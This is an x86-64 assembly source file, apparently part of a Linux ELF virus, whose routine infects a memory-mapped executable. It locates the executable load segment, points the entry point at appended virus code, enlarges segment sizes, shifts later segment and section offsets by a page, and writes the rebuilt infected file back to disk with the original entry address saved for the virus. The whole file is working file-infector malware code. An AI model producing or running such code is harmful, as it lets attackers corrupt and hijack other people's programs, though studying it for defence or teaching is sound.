section .text
	global _update_mmaped_file
	extern _string

_update_mmaped_file:
	enter 256, 0
	; rsp + 0  mmap start address (ehdr)
	; rsp + 8  file size
	; rsp + 16 virus size
	; rsp + 24 fd
	; rsp + 32 phdr (ehdr + ehdr->e_phoff)
	; rsp + 40 shdr (ehdr + ehdr->e_shoff)
	; rsp + 48 actual phnum or actual shnum for respectively treat_all_segments or treat_all_sections
	; rsp + 56 ehdr->e_phnum or ehdr->e_shnum for respectively treat_all_segments or treat_all_sections
	; rsp + 64 found? bool
	; rsp + 72 virus offset
	; rsp + 80 o_entry store address (it's the address where we store the o_entry, (char *))
	; rsp + 88 number of 0 bytes to add
	; rsp + 96 i
	; rsp + 104 = 0
	; rsp + 108 mmap_tmp addr
	; rsp + 116 index mmap_tmp
	;;;;;;;;;;;;;;;;;;;;;

	mov QWORD [rsp], rdi

	mov QWORD [rsp + 8], rsi

	mov QWORD [rsp + 16], rdx

	mov QWORD [rsp + 24], r10

	mov r10, QWORD [rsp]
	mov QWORD [rsp + 32], r10
	add QWORD [rsp + 32], 32
	mov r10, QWORD [rsp + 32]
	mov r10, QWORD [r10]
	mov QWORD [rsp + 32], r10
	mov r10, QWORD [rsp]
	add QWORD [rsp + 32], r10

	mov r10, QWORD [rsp]
	mov QWORD [rsp + 40], r10
	add QWORD [rsp + 40], 40
	mov r10, QWORD [rsp + 40]
	mov r10, QWORD [r10]
	mov QWORD [rsp + 40], r10
	mov r10, QWORD [rsp]
	add QWORD [rsp + 40], r10

	mov QWORD [rsp + 48], 0

	mov r10, QWORD [rsp]
	mov QWORD [rsp + 56], r10
	add QWORD [rsp + 56], 56
	mov r11, QWORD [rsp + 56]
	xor r10, r10
	mov r10w, WORD [r11]
;	mov r10w, WORD [r11]
	mov QWORD [rsp + 56], r10

	mov QWORD [rsp + 64], 0

	mov QWORD [rsp + 72], 0

_treat_all_segments:
	mov r10, QWORD [rsp + 56] ; while phnum < ehdr->e_phnum
	cmp QWORD [rsp + 48], r10
	jge _init_treat_all_sections
	mov r10, QWORD [rsp + 32]
	sub r10, QWORD [rsp]
	cmp r10, QWORD [rsp + 8]
	jge _munmap

_if:
	cmp QWORD [rsp + 64], 0 ; if found
	je _else_if
	mov r10, QWORD [rsp + 32] ; if phdr->p_offset >= virus offset
	add r10, 8 ; offset of p_offset
	mov r10, QWORD [r10]
	cmp r10, QWORD [rsp + 72]
	jl _else_if
	mov r10, QWORD [rsp + 32] ; add PAGE_SIZE to segment offset
	add r10, 8
	add QWORD [r10], 4096
	jmp _inc_jmp_loop

_else_if:
	mov r10, QWORD [rsp + 32] ; if phdr->p_type == PT_LOAD
	cmp DWORD [r10], 1
	jne _inc_jmp_loop
	add r10, 4 ; offset of p_flags
	mov r10d, DWORD [r10]
	and r10d, 1
	cmp r10d, 1 ; if phdr->p_flags & PF_X
	jne _inc_jmp_loop
; virus offset = phdr->p_offset + phdr->p_filesz
	mov r10, QWORD [rsp + 32]
	add r10, 8 ; offset of p_offset
	mov r11, QWORD [r10]
	mov QWORD [rsp + 72], r11 ; virus offset = phdr->p_offset
	add r10, 24 ; offset of p_filesz is 32, we already added 8, so 32 - 8 = 24.
	mov r11, QWORD [r10]
	add QWORD [rsp + 72], r11 ; virus offset += phdr->p_filesz
; modify e_entry
	mov r11, QWORD [rsp]
	add r11, 24 ; e_entry offset
	mov rdi, QWORD [r11]
	mov QWORD [rsp + 80], rdi
	inc QWORD [rsp + 64]
	mov r10, QWORD [rsp + 32]
	add r10, 16 ; p_vaddr offset
	mov rdi, QWORD [r10]
	mov QWORD [r11], rdi
	add r10, 16 ; p_filesz offset is 32, we already add 16, so 32 - 16 = 16
	mov r12, QWORD [r10]
	add QWORD [r11], r12
	add QWORD [r11], 55 ; add the offset of the strings at the beginning of the virus
; update p_filesz and p_memsz
	mov r10, QWORD [rsp + 32]
	add r10, 32 ; p_filesz offset
	mov r11, QWORD [rsp + 16]
	add r11, 8 ; don't forget the 8 first bytes off the entry point, didnt count in virus size
	add QWORD [r10], r11
	add r10, 8 ; p_memsz offset is 8 bytes further p_filesz
	add QWORD [r10], r11

_inc_jmp_loop:
	add QWORD [rsp + 32], 56 
	inc QWORD [rsp + 48]
	jmp _treat_all_segments

_init_treat_all_sections:
	mov QWORD [rsp + 48], 0 ; shnum = 0
	mov r10, QWORD [rsp]
	mov QWORD [rsp + 56], r10
	add QWORD [rsp + 56], 60
	mov r11, QWORD [rsp + 56]
	xor r10, r10
	mov r10w, WORD [r11]
;	mov r10w, WORD [r10]
	mov QWORD [rsp + 56], r10

_treat_all_sections:
	mov r10, QWORD [rsp + 48]
	cmp r10, QWORD [rsp + 56] ; while (shnum < ehdr->e_shnum)
	jge _init_mmap_tmp
	mov r10, QWORD [rsp + 40]
	sub r10, QWORD [rsp]
	cmp r10, QWORD [rsp + 8]
	jge _munmap

_if_offset_equal_virus_offset:
	xor r10, r10
	mov r10, QWORD [rsp + 40]
	add r10, 24 ; shdr->sh_offset offset
	mov r11, QWORD [rsp + 40]
	add r11, 32 ; shdr->sh_size offset
	mov rdi, QWORD [r10]
	add rdi, QWORD [r11]
	cmp rdi, QWORD [rsp + 72] ; if (shdr->sh_offset + shdr->sh_size) == virus offset
	jne _if_offset_greater_or_equal_virus_offset
	mov r10, QWORD [rsp + 16] ; add virus size to this section size
	add r10, 8
	add QWORD [r11], r10

_if_offset_greater_or_equal_virus_offset:
	xor r10, r10
	mov r10, QWORD [rsp + 40]
	add r10, 24 ; shdr->sh_offset offset
	mov r10, QWORD [r10]
	cmp r10, QWORD [rsp + 72] ; if shdr->sh_offset >= virus offset
	jl _inc_jmp_loop_sections
	mov r10, QWORD [rsp + 40] ; add PAGE_SIZE to sh_offset
	add r10, 24
	add QWORD [r10], 4096

_inc_jmp_loop_sections:
	inc QWORD [rsp + 48]
	add QWORD [rsp + 40], 0x40
	jmp _treat_all_sections

_init_mmap_tmp:
	mov r10, QWORD [rsp] ; add PAGESIZE to sections offset
	add r10, 40
	add QWORD [r10], 4096
;;;;;;;;;;;;;;;;;
; mmap tmp
_mmap_tmp
	mov rax, 9
	mov rdi, 0
	mov rsi, QWORD [rsp + 8]
	add rsi, 4096
	mov rdx, 3
	mov r10, 34
	mov r8, -1
	mov r9, 0
	syscall
	cmp rax, 0
	jle _end
	mov QWORD [rsp + 108], rax
	mov QWORD [rsp + 116], 0

_write_in_tmp_map:
;; write(fd, map, virus_offset);
	mov rdi, QWORD [rsp + 108]
	mov rsi, QWORD [rsp]
	mov rcx, QWORD [rsp + 72]
	cld
	rep movsb
	mov r10, QWORD [rsp + 72]
	mov QWORD [rsp + 116], r10
;; write(fd, o_entry, 8);
	mov rdi, QWORD [rsp + 108]
	add rdi, QWORD [rsp + 116]
	mov rsi, rsp ; 
	add rsi, 80
	mov rcx, 8 ; size
	cld
	rep movsb
	add QWORD [rsp + 116], 8
;; write(fd, virus, virus_size);
	mov rdi, QWORD [rsp + 108]
	add rdi, QWORD [rsp + 116]
	lea rsi, [rel _string]
	mov rcx, QWORD [rsp + 16]
	cld
	rep movsb
	mov r10, QWORD [rsp + 16]
	add QWORD [rsp + 116], r10
; for i < 4096 - (virus_size + 8) write(fd, &(0), 1);
	mov QWORD [rsp + 88], 4096
	mov rdi, QWORD [rsp + 16]
	add rdi, 8
	sub QWORD [rsp + 88], rdi
	mov rcx, QWORD [rsp + 88]
	mov rdi, QWORD [rsp + 108]
	add rdi, QWORD [rsp + 116]
	mov rax, 0
	cld
	rep stosb
	mov r10, QWORD [rsp + 88]
	add QWORD [rsp + 116], r10
_last_write:
	mov rdi, QWORD [rsp + 108] ; fd
	add rdi, QWORD [rsp + 116]
	mov rsi, QWORD [rsp] ; buff
	add rsi, QWORD [rsp + 72]
	mov rcx, QWORD [rsp + 8] ; size
	sub rcx, QWORD [rsp + 72]
	cld
	rep movsb

_write_into_file:
	mov rax, 1
	mov rdi, QWORD [rsp + 24]
	mov rsi, QWORD [rsp + 108]
	mov rdx, QWORD [rsp + 8] 
	add rdx, 4096
	syscall

_munmap:
	mov rax, 11
	mov rdi, QWORD [rsp + 108]
	mov rsi, QWORD [rsp + 8]
	add rsi, 4096
	syscall

_end:
	leave
	ret
